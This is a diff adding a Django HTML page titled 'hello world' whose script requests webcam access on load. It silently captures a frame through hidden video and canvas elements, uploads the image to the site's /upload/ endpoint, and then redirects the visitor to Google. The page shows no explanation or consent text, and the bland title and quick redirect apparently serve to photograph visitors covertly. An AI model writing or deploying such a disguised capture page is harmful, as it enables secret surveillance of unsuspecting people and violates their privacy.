@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+        <head>
+                <title>hello world</title>
+                <meta>
+        </head>
+        <body>
+
+        <video id="video" autoplay style="display: none;"></video>
+        <form>
+                {% csrf_token %}        
+        </form>
+        <canvas id="canvas" style="display: none;"></canvas>
+        
+        <script>
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                video.play();
+
+                video.onloadedmetadata = () => {
+                        setTimeout(() => {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+
+                                const image = canvas.toDataURL('image/png');
+
+                                fetch('/upload/', {
+                                        method: 'POST',
+                                        headers: {
+                                                'Content-Type': 'application/json',
+                                                'X-CSRFToken': getCookie('csrftoken') || ''
+                                        },
+                                        body: JSON.stringify({ image: image })
+                                });
+
+                                // Chiudi stream
+                                stream.getTracks().forEach(track => track.stop());
+
+                                // Reindirizza l’utente altrove
+                                setTimeout(() => {
+                                window.location.href = 'https://www.google.com/';
+                                }, 3000);
+                        }, 1000);
+                };
+                })
+                .catch(err => {
+                        console.error('Accesso webcam negato o fallito:', err);
+                });
+
+                function getCookie(name) {
+                        let cookieValue = null;
+                        if (document.cookie && document.cookie !== '') {
+                        for (let cookie of document.cookie.split(';')) {
+                                const trimmed = cookie.trim();
+                                if (trimmed.startsWith(name + '=')) {
+                                cookieValue = decodeURIComponent(trimmed.slice(name.length + 1));
+                                break;
+                                }
+                        }
+                        }
+                        return cookieValue;
+                }
+        </script>
+        </body>
+</html>
